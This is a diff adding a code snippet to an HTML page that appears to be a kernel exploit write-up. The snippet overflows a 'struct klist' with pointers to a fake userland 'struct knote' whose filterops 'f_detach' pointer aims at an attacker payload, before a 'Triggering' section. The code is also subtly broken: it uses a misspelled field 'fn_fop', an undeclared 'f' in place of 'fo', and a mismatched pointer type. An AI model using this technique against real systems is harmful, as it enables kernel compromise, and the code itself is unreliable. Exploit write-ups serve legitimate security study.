@@ -651,6 +651,19 @@ while(sock != fd) {
 					So all we need to do is overflow <code>struct klist</code> to point to a carefully crafted userland <code>struct knote</code> who's <code>kn_fop</code> member points to a controlled <code>struct filterops</code>, which contains the <code>f_detach</code> function pointer aimed at our payload.
 				</p>
 				
+				<pre><code>struct knote kn;
+struct filterops fo;
+
+struct knote *overflow = (struct knote *)(mapping + bufferSize);
+
+for(i = 0; i &lt; overflowSize / sizeof(struct knote *); i++) {
+	overflow[i] = &amp;kn;
+}
+
+kn.fn_fop = &amp;f;
+
+fo.f_detach = payload;</code></pre>
+				
 				<br>
 				
 				<h2>Triggering</h2>
